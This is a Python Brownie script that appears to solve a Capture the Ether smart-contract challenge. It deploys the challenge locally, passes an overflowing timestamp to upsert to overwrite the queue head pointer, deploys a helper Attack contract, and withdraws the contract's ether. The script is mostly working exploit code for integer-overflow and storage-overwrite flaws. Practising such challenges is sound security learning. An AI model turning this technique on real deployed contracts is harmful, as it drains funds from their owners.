#!/usr/bin/python3
from time import time

from brownie import Attack
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# ? https://ledgerops.com/blog/capture-the-ether-part-2-of-3-diving-into-ethereum-math-vulnerabilities/

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _, attacker = deploy()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # max uint256 - time in seconds
    overflow = (2**256) - (24 * 60 * 60)
    value = "1 ether"

    # ? uint256 index, uint256 timestamp
    overwrite_head_pointer = target.upsert(
        1, overflow, {"from": attacker, "value": value}
    )
    overwrite_head_pointer.wait(1)

    # ? uint256 index, uint256 timestamp
    reset_head_pointer = target.upsert(2, 0, {"from": attacker, "value": value})
    reset_head_pointer.wait(1)

    # print(target.owner())
    # print(attacker)

    attack = Attack.deploy(target.address, {"from": attacker, "value": value})
    attack.wait(1)

    # ? uint256 index
    withdraw = target.withdraw(2, {"from": attacker})
    withdraw.wait(1)

    print_colour(target.isComplete())

    # assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
